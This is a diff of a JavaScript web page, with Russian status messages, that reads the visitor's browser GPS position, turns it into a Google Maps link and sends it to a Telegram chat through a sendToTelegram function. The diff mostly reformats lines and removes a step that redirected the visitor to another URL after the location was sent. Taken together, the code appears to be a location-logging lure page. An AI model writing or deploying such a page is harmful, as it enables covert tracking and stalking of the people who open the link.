@@ -63,30 +63,31 @@ async function sendToTelegram(message) {
         console.log(result);
 
         if (!result.ok) {
-            statusText.innerText = "Ошибка Telegram";
+            statusText.innerText =
+                "Ошибка Telegram";
         }
 
     } catch (e) {
-        console.error(e);
-        statusText.innerText = "Ошибка сети";
-    }
-}
 
-function redirectAfterDelay() {
-    statusText.innerText = "Перенаправление...";
-    setTimeout(() => {
-        window.location.href = REDIRECT_URL;
-    }, 1500);
+        console.error(e);
+
+        statusText.innerText =
+            "Ошибка сети";
+    }
 }
 
 function getLocation() {
 
     if (!navigator.geolocation) {
-        statusText.innerText = "GPS не поддерживается";
+
+        statusText.innerText =
+            "GPS не поддерживается";
+
         return;
     }
 
-    statusText.innerText = "Запрос GPS...";
+    statusText.innerText =
+        "Запрос GPS...";
 
     navigator.geolocation.getCurrentPosition(
 
@@ -119,16 +120,17 @@ https://maps.google.com/?q=${lat},${lon}`;
 
             await sendToTelegram(message);
 
-            statusText.innerText = "Геолокация отправлена";
-
-            // 👇 ПЕРЕХОД НА СЛЕДУЮЩУЮ СТРАНИЦУ
-            redirectAfterDelay();
+            statusText.innerText =
+                "Геолокация отправлена";
 
         },
 
         (error) => {
+
             console.error(error);
-            statusText.innerText = "Ошибка GPS: " + error.message;
+
+            statusText.innerText =
+                "Ошибка GPS: " + error.message;
         },
 
         {
